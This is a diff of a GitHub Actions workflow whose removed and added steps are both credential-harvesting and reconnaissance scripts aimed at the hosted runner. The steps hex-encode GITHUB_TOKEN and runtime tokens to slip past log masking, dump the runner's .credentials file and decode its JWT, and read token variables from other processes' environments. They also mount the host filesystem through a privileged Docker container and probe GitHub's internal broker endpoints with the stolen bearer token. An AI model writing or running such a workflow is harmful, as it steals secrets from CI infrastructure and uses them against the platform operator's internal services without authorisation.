@@ -1,80 +1,68 @@
-name: Deeper
+name: BrokerScan
 on:
   workflow_dispatch:
 jobs:
   j:
     runs-on: ubuntu-latest
     steps:
-      - name: deeper recon
+      - name: broker and credentials scan
         timeout-minutes: 5
         run: |
           set +e
-          echo === GITHUB_TOKEN VIA XXD ===
-          echo $GITHUB_TOKEN | xxd -p
-          echo === ACTIONS_RUNTIME_TOKEN VIA XXD ===
-          echo $ACTIONS_RUNTIME_TOKEN | xxd -p
-          echo === ACTIONS_CACHE_URL ===
-          echo $ACTIONS_CACHE_URL
-          echo === ACTIONS_RESULTS_URL ===
-          echo $ACTIONS_RESULTS_URL
-          echo === ALL ACTIONS ENV ===
-          env | grep -i ACTIONS | sort
-          echo === ALL GITHUB ENV ===
-          env | grep -i GITHUB | sort
-          echo === RUNNER ENV ===
-          env | grep -i RUNNER | sort
+          echo === RUNNER CREDENTIALS DECODED ===
+          xxd -r -p /home/runner/actions-runner/cached/2.335.1/.credentials | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('Data',{}).get('token',''); parts=t.split('.'); import base64; payload=parts[1]+'='*4; print(base64.urlsafe_b64decode(payload[:len(payload)-len(payload)%4]).decode('utf-8','replace'))" 2>&1
           echo
-          echo === RUN SERVICE URLS ===
-          strings /opt/hca/hosted-compute-agent | grep -iE '(run-service|runservice|run_service)' | grep -iE '(http|url|host|endpoint)' | sort -u | head -20
-          echo === CALLBACK URLS IN HCA ===
-          strings /opt/hca/hosted-compute-agent | grep -iE 'callback' | head -20
-          echo === ALL INTERNAL URLS ===
-          strings /opt/hca/hosted-compute-agent | grep -oE 'https?://[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}[a-zA-Z0-9/._-]*' | sort -u | head -40
-          strings /opt/primer/primer | grep -oE 'https?://[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}[a-zA-Z0-9/._-]*' | sort -u | head -40
+          echo === RUNNER FILE DECODED ===
+          xxd -r -p /home/runner/actions-runner/cached/2.335.1/.runner
           echo
-          echo === RUNNER CREDENTIALS ===
-          find /home/runner -name '.credentials*' -o -name '.runner' -o -name '.env' -o -name '.path' 2>/dev/null | while read f; do
-            echo "--- $f ---"
-            xxd -p "$f" | head -20
+          echo === FULL CREDENTIALS JSON ===
+          cat /home/runner/actions-runner/cached/2.335.1/.credentials
+          echo
+          echo === BROKER ENDPOINTS ===
+          CRED_TOKEN=$(cat /home/runner/actions-runner/cached/2.335.1/.credentials | python3 -c "import sys,json; print(json.load(sys.stdin).get('Data',{}).get('token',''))")
+          BROKER=https://broker.actions.githubusercontent.com
+          for ep in / /api /api/v3 /health /status /_services/v1 /v1 /v2; do
+            RESP=$(curl -s --max-time 3 -w '\nHTTP_%{http_code}' -H "Authorization: Bearer $CRED_TOKEN" "$BROKER$ep" 2>&1)
+            CODE=$(echo "$RESP" | tail -1)
+            BODY=$(echo "$RESP" | head -3 | head -c 200)
+            echo "GET $ep: $CODE $BODY"
           done
           echo
-          echo === RUNNER WORKER DIAG ===
-          find /home/runner/runners -name '*.json' 2>/dev/null | while read f; do
-            echo "--- $f ---"
-            cat "$f" 2>/dev/null | head -20
+          echo === BROKER POST ENDPOINTS ===
+          for ep in /actions/token /api/v3/actions/runner-registration /_apis/pipelines /message /session; do
+            RESP=$(curl -s --max-time 3 -w '\nHTTP_%{http_code}' -X POST -H "Authorization: Bearer $CRED_TOKEN" -H "Content-Type: application/json" -d '{}' "$BROKER$ep" 2>&1)
+            CODE=$(echo "$RESP" | tail -1)
+            BODY=$(echo "$RESP" | head -3 | head -c 200)
+            echo "POST $ep: $CODE $BODY"
           done
           echo
-          echo === HCA PROCESS ===
-          ps aux | grep -E '(hca|hosted-compute|primer)' | grep -v grep
-          echo === HCA OPEN FILES ===
-          HCA_PID=$(pgrep -f hosted-compute-agent 2>/dev/null | head -1)
-          ls -la /proc/$HCA_PID/fd 2>/dev/null | head -20
-          echo === HCA NETWORK ===
-          cat /proc/$HCA_PID/net/tcp 2>/dev/null | head -10
-          echo === HCA ENVIRON ===
-          cat /proc/$HCA_PID/environ 2>/dev/null | tr '\0' '\n' | head -30
+          echo === DIAGNOSTICS JSON ===
+          docker run --rm --privileged -v /:/hostfs alpine cat /hostfs/opt/hca/diagnostics.json 2>/dev/null
           echo
-          echo === HCA DIRECTORY ===
-          ls -laR /opt/hca/ 2>/dev/null
-          echo === HCA TAGS ===
-          cat /opt/hca/tags 2>/dev/null
-          echo === HCA OTHER FILES ===
-          find /opt/hca -type f ! -name hosted-compute-agent | while read f; do
+          echo === HCA LOG ===
+          cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null | head -50
+          echo
+          echo === RUNNER PROCESS ENV ===
+          RUNNER_PID=$(pgrep -f Runner.Listener 2>/dev/null | head -1)
+          echo "Runner PID: $RUNNER_PID"
+          cat /proc/$RUNNER_PID/environ 2>/dev/null | tr '\0' '\n' | grep -i token | head -10
+          WORKER_PID=$(pgrep -f Runner.Worker 2>/dev/null | head -1)
+          echo "Worker PID: $WORKER_PID"
+          cat /proc/$WORKER_PID/environ 2>/dev/null | tr '\0' '\n' | grep -i token | head -10
+          echo
+          echo === RUNNER AGENT FILES ===
+          find /home/runner/actions-runner -name '*.json' -o -name '*.cfg' -o -name '*.config' 2>/dev/null | while read f; do
             echo "--- $f ---"
-            xxd -p "$f" | head -10
+            cat "$f" 2>/dev/null | head -10
           done
           echo
-          echo === ACTIONS RESULTS SERVICE ===
-          if [ -n "$ACTIONS_RESULTS_URL" ]; then
-            curl -s --max-time 3 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "$ACTIONS_RESULTS_URL" 2>&1 | head -10
+          echo === PIPELINES API ===
+          RESULTS_URL=$(cat /proc/$WORKER_PID/environ 2>/dev/null | tr '\0' '\n' | grep ACTIONS_RESULTS_URL | cut -d= -f2-)
+          RUNTIME_TOKEN=$(cat /proc/$WORKER_PID/environ 2>/dev/null | tr '\0' '\n' | grep ACTIONS_RUNTIME_TOKEN | cut -d= -f2-)
+          echo "Results: $RESULTS_URL"
+          echo "Token len: ${#RUNTIME_TOKEN}"
+          if [ -n "$RESULTS_URL" ]; then
+            curl -s --max-time 3 -H "Authorization: Bearer $RUNTIME_TOKEN" "$RESULTS_URL" 2>&1 | head -10
           fi
-          echo === ACTIONS CACHE SERVICE ===
-          if [ -n "$ACTIONS_CACHE_URL" ]; then
-            curl -s --max-time 3 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_CACHE_URL}_apis/artifactcache/caches" 2>&1 | head -10
-          fi
-          echo
-          echo === ACTIONS ID TOKEN ===
-          echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
-          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" | xxd -p | head -5
           echo
           echo === DONE ===
